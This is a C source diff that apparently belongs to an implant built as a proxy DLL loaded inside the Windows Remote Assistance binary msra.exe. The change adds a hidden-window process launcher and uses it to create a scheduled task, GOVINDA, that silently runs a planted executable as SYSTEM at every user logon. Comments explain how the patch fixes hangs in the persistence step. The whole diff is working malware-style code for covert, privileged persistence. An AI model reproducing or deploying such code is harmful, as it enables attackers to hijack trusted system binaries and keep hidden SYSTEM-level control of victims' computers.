@@ -91,22 +91,52 @@ static void create_lnk(void) {
     sl->lpVtbl->Release(sl);
 }
 
+/* ponytail: launch schtasks.exe directly (no cmd.exe /c wrapper) with stdio
+   redirected to \\.\NUL via STARTUPINFO. The proxy DLL runs inside msra.exe
+   which has no console; system() := cmd.exe /c ... >nul 2>&1 deadlocks inside
+   a windowless host waiting on the redirected handles, so worker_thread never
+   advances past the GOVINDA system() call (Orion never gets created - matches
+   the audit log which ends at "Creating GOVINDA task"). Bounded WaitForSingle
+   Object makes any hang the proxy's problem, not Task Scheduler's. */
+static int run_schtasks(const char *cmdline, DWORD timeoutMs) {
+    HANDLE nul = CreateFileA("\\\\.\\NUL", GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    STARTUPINFOA si;    memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = nul; si.hStdError = nul; si.hStdInput = NULL;
+    PROCESS_INFORMATION pi; memset(&pi, 0, sizeof(pi));
+
+    char buf[MAX_PATH * 6];
+    lstrcpynA(buf, cmdline, sizeof(buf));
+    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        if (nul) CloseHandle(nul);
+        return -1;
+    }
+    WaitForSingleObject(pi.hProcess, timeoutMs);
+    DWORD code = STILL_ACTIVE;
+    GetExitCodeProcess(pi.hProcess, &code);
+    if (code == STILL_ACTIVE) TerminateProcess(pi.hProcess, 1);
+    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+    if (nul) CloseHandle(nul);
+    return (int)code;
+}
+
 static void create_task_govinda(void) {
     char taskPath[MAX_PATH];
     wsprintfA(taskPath, "%s\\msra.exe", g_dir);
 
-    // ponytail: check existence via schtasks /query, create if missing
+    // ponytail: check existence via schtasks /query (short timeout; query is fast)
     char q[MAX_PATH * 2];
-    wsprintfA(q, "schtasks.exe /query /tn GOVINDA >nul 2>&1");
-    if (system(q) == 0) { audit("[+] GOVINDA task already exists"); return; }
+    wsprintfA(q, "schtasks.exe /query /tn GOVINDA");
+    if (run_schtasks(q, 10000) == 0) { audit("[+] GOVINDA task already exists"); return; }
 
     /* ponytail: /ru SYSTEM skips the interactive password prompt that
-       /rl highest (no /ru) hits and that hangs system() in a non-interactive
-       session. /sc onlogon still fires on any user logon. */
+       /rl highest (no /ru) hits and hangs in a non-interactive session.
+       /sc onlogon still fires on any user logon. */
     char c[MAX_PATH * 4];
-    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f >nul 2>&1", taskPath);
+    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f", taskPath);
     audit("[+] Creating GOVINDA task (schtasks.exe)");
-    if (system(c) == 0) audit("[+] GOVINDA task created");
+    if (run_schtasks(c, 30000) == 0) audit("[+] GOVINDA task created");
     else audit("[-] GOVINDA task creation failed");
 }
 
